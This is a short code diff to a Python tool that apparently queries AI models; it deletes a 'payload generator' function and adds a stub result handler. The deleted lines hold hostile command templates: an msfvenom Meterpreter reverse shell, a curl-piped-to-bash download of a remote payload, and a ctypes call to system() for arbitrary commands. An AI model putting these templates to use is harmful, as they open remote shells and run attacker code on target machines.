@@ -392,10 +392,9 @@ def standard_mode(model_id, user_prompt, api_key, params):
     
     return {"output": output, "time": time.time()}
 
-# --- PAYLOAD GENERATOR ---
-def generate_payload(payload_type, payload_format, obfuscation_level):
-    """Generate optimized payload for target system"""
-    payload_templates = {
-        "Shellcode": "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={ip} LPORT={port}",
-        "Command Injection": "bash -c 'curl -s http://{url}/payload.sh | bash'",
-        "Memory Manipulation": "echo 'executing memory patch' && /usr/bin/python3 -c 'import ctypes; ctypes.CDLL(\"libc.so.6\").system(\"{cmd}\")
+# --- RESULT HANDLER ---
+def handle_results(results, store_results, export_results, log_to_file):
+    """Handle and store results appropriately"""
+    # Create unique ID for session
+    session_id = str(uuid.uuid4())
+    
